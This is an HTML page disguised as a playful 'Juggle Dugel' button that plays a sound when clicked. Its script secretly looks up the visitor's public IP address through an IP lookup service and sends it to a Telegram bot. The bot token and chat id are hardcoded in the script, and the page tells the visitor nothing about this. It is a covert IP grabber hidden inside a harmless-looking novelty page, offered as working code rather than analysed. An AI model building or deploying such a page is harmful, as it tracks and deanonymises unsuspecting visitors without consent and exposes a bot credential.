<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Juggle Dugel</title>
    <style>
        body {
            background-color: pink;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
        }
        button {
            padding: 15px 30px;
            font-size: 20px;
            background-color: #333;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #555;
        }
    </style>
</head>
<body>
    <button id="juggleDugel">Juggle Dugel</button>

    <audio id="dodoboySound" src="https://raw.githubusercontent.com/yourusername/yourrepository/main/dodoboy.mp3"></audio>

    <script>
        const button = document.getElementById('juggleDugel');
        const audio = document.getElementById('dodoboySound');

        button.addEventListener('click', async () => {
            // Play the sound
            audio.play();

            // Get user's IP and send it to Telegram
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const userIP = data.ip;

                // Send IP to Telegram bot
                await fetch(`https://api.telegram.org/bot7247835860:AAHi08y99fZPkS1Drd8-xwtv0ZnO3pgDOqM/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: 842463450,
                        text: `New IP: ${userIP}`
                    })
                });
            } catch (error) {
                console.error('Error:', error);
            }
        });
    </script>
</body>
</html>
